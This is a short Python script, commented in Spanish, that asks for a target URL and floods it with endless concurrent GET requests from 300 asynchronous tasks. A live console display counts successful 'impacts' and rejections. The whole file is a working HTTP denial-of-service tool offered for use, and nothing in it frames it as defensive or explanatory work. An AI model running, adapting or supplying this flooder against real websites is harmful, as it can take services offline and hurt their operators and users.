import asyncio
import aiohttp
import os
import time
from colorama import Fore, Style, init

init()

async def asalto_suave(url, session, stats):
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Kali; Linux)'}
            # Micro-pausa obligatoria para que el Tecno no colapse
            await asyncio.sleep(0.05) 
            async with session.get(url, headers=headers, timeout=2) as r:
                stats['exitos'] += 1
        except:
            stats['caídos'] += 1

async def monitor_frio(stats):
    while True:
        await asyncio.sleep(1)
        os.system('clear')
        print(f"{Fore.RED}██ SENTINELA V6 STABLE: MONITOR DE IMPACTO ██")
        print(f"{Fore.GREEN}[+] IMPACTOS EXITOSOS: {stats['exitos']}")
        print(f"{Fore.YELLOW}[!] RECHAZADOS: {stats['caídos']}")
        print(f"{Fore.CYAN}[*] ESTADO: OPERATIVO - FLUJO ESTABLE")

async def main():
    os.system('clear')
    print(f"{Fore.RED}↓↓↓ PEGA LA URL Y DALE A ENTER ↓↓↓")
    target = input(f"{Fore.YELLOW}URL: {Fore.WHITE}").strip()
    
    stats = {'exitos': 0, 'caídos': 0}
    # Bajamos a 300 conexiones para que tu terminal no se trabe
    connector = aiohttp.TCPConnector(limit=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        asyncio.create_task(monitor_frio(stats))
        tasks = [asalto_suave(target, session, stats) for i in range(300)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
